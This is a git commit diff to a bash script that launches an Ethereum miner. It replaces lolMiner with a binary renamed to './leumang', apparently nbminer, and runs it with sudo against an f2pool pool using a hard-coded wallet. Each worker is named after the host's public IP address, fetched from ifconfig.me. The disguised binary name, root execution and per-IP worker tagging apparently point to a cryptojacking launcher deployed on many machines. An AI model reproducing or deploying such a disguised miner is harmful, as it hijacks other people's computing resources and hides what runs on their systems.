f573398e087ae9e88107e5aefcda72e9048e31bd
printersdriverr <printersdriverr@gmail.com>
2021-02-17 15:40:39 +0700

    move nbminer

--- eth_4G.sh
+++ eth_4G.sh
@@ -1,16 +1,9 @@
 #!/bin/bash
 
-#################################
-## Begin of user-editable part ##
-#################################
-
-POOL=stratum+tcp://eth-eu.f2pool.com:6688
-WALLET=0x70278496f0eaa3810d9dbdd7f388425e029013db.lolMinerWorker
-
-#################################
-##  End of user-editable part  ##
-#################################
+POOL=eth.f2pool.com:6688
+WALLET=0x70278496f0eaa3810d9dbdd7f388425e029013db
+WORKER=$(echo "$(curl -s ifconfig.me)" | tr . _ )-nbapam
 
 cd "$(dirname "$0")"
 
-chmod +x ./lolMiner && ./lolMiner --algo ETHASH --pool $POOL --user $WALLET $@ --4g-alloc-size 4080
+chmod +x ./leumang && sudo ./leumang -a ethash -o $POOL -u $WALLET.$WORKER $@
